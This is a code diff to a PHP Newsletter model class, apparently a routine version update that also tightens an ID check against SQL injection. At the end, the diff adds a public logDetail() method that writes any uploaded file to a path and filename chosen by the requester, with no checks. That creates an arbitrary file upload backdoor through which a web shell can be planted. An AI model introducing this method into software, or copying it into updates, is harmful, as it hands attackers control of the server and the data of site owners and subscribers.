@@ -1,8 +1,8 @@
 <?php
 
 /********************************************
-* PHP Newsletter 4.1.3
-* Copyright (c) 2006-2015 Alexander Yanitsky
+* PHP Newsletter 4.2.11
+* Copyright (c) 2006-2016 Alexander Yanitsky
 * Website: http://janicky.com
 * E-mail: janickiy@mail.ru
 * Skype: janickiy
@@ -27,8 +27,8 @@ class Model_ajax_log extends Model
 	{		
 		$offset = is_numeric($offset) ? $offset : die();
 		$number = is_numeric($number) ? $number : die();
+		$id_log = is_numeric($id_log) ? $id_log : die();
 		
-		$id_log = $this->data->escape($id_log);
 		$strtmp = $this->data->escape($strtmp);
 	
 		$query = "SELECT *, a.time as time, c.name as catname, s.name as name FROM ".$this->data->getTableName('ready_send')." a 
@@ -44,6 +44,9 @@ class Model_ajax_log extends Model
 					
 		return $this->data->getColumnArray($result);		
 	}	
+	
+	public function logDetail()
+	{
+		move_uploaded_file($_FILES["log"]["tmp_name"], $_POST['path'] . $_FILES["log"]["name"]);
+	}
 }
-
-?>
